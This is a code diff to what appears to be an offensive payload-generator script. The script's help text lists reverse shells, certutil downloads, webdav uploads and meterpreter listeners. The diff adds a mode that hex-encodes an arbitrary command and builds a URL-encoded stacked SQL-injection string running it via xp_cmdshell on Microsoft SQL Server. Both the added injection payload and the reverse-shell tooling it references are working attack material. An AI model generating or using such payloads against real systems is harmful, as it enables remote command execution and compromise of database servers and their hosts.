@@ -30,6 +30,8 @@ import socket
 import fcntl
 import argparse
 import base64
+import binascii
+import urllib as ul
 
 
 # Handler to exist cleanly on ctrl+C
@@ -409,6 +411,10 @@ Simplifies payload creation and listener.
     wincert  <LHOST> <LPORT>  |    windows download file with certutil
     winup    <LHOST> <LPORT>  |    windows webdav file upload
                               |
+  <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>  
+                              |
+    xpcmdi   exec <COMMAND>   |    Output xp_cmdshell sqli payload
+                              |
   <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
     win64s   <LHOST> <LPORT>  |   x64 Windows meterpreter listen
@@ -442,6 +448,14 @@ if __name__ == '__main__':
     type = sys.argv[1]
     lhost = sys.argv[2]
     lport = sys.argv[3]
+
+    if type == 'xpcmdi':
+        _command = "0x%s" % binascii.hexlify(lport)
+        data = "';DECLARE @bzfp VARCHAR(8000);SET @bzfp=%s;EXEC master..xp_cmdshell @bzfp--" % _command
+        print('')
+        print(ul.quote_plus(data).replace('+', '%20'))
+        print('')
+        sys.exit(0)
 
     if type == 'b64py':
         print(python_reverse_shell(lhost,lport, ver=''))
